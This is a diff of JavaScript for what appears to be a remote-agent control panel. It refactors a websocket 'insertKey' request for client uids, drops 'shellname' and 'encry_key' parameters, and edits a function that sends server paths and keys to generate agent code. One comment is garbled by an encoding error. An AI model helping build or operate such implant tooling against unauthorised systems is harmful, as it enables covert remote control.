@@ -708,7 +708,7 @@ function buildClientCardNode(client, index) {
     btnReceive.className = 'btn receive';
     btnReceive.dataset.role = 'receive';
     btnReceive.onclick = () => {
-        get_conn(client.uid, client.host);
+        get_conn(client.uid);
     };
 
     const btnRemove = document.createElement('button');
@@ -757,7 +757,7 @@ function updateClientCardNode(container, client, index) {
     const btnReceive = container.querySelector('[data-role="receive"]');
     if (btnReceive) {
         btnReceive.onclick = () => {
-            get_conn(client.uid, client.host);
+            get_conn(client.uid);
         };
     }
 
@@ -2711,19 +2711,53 @@ class index{
 	        }
 	    }
 	}
-        async get(uid,shellname){
+        async get(uid) {
             const confirm1 = await customConfirm("confirm?");
-            if(!confirm1){
+            if (!confirm1) {
                 return false;
             }
-            const sent = await webSocketClient.send(
-                "insertKey",
-                {
-                    uid:uid,
-                    request:shellname
-                }
+
+            const uidString = String(uid);
+
+            const responsePromise = webSocketClient.waitForMessage(
+                (msg) =>
+                    msg.path === "insertKey" &&
+                    msg.uid === uidString &&
+                    (msg.code === 200 || msg.code === 400 || msg.code === 409)
             );
-            return sent ? uid : false;
+
+            const sent = await webSocketClient.send("insertKey", {
+                uid: uidString
+            });
+
+            if (!sent) {
+                customLog("Insert key request failed");
+                return false;
+            }
+
+            try {
+                const result = await responsePromise;
+
+                if (
+                    result &&
+                    result.path === "insertKey" &&
+                    result.uid === uidString &&
+                    result.code === 200
+                ) {
+                    customLog("Key inserted successfully");
+                    return uid;
+                }
+                if (result?.code === 409) {
+                    customLog("Key already exists");
+                    return false;
+                }
+
+                customLog("Insert key failed:", result);
+                return false;
+            } catch (err) {
+                customLog("Insert key error:", err?.message || err);
+                return false;
+            }
         }
         async del(index, info = "") {
 		    const confirmed = await customConfirm("confirm?");
@@ -6028,7 +6062,6 @@ class lain_server {
                     server.conn_path,
                     server.msg_path,
                     server.switch_path,
-                    server.encry_path,
                     server.download_path,
                     server.result_path,
                     server.net_path,
@@ -6544,10 +6577,10 @@ class lain_server {
         // 閲婃斁 URL
         URL.revokeObjectURL(url);
     }
-    async redirectToAgentCode(protocol,os,server,path,connPath,msgPath,switch_key,encry_key,
+    async redirectToAgentCode(protocol,os,server,path,connPath,msgPath,switch_key,
         download,result,net,info,upload,list,option,uid,hostname,keyPart,filekey,code,windows_pro){
         try {
-            console.log(protocol,os,server,path,connPath,msgPath,switch_key,encry_key,download,result,net,info,upload,list,option,uid,hostname,keyPart,filekey,code,windows_pro);
+            console.log(protocol,os,server,path,connPath,msgPath,switch_key,download,result,net,info,upload,list,option,uid,hostname,keyPart,filekey,code,windows_pro);
             webSocketClient.send(
                 "agentcode",
                 {
@@ -6558,7 +6591,6 @@ class lain_server {
                     ConnPath: connPath,
                     MsgPath: msgPath,
                     switch_key: switch_key,
-                    encry_key: encry_key,
                     download: download,
                     result: result,
                     net: net,
@@ -7962,11 +7994,11 @@ window.showMsgDialog = function(uid, host) {
         window.lainIndex.showMsgDialog(uid, host);
     }
 };
-window.get_conn = async function(uid, shellname) {
+window.get_conn = async function(uid) {
     if (!window.l_index) {
         return false;
     }
-    const sent = await window.l_index.get(uid, shellname);
+    const sent = await window.l_index.get(uid);
     if (!sent) {
         return false;
     }
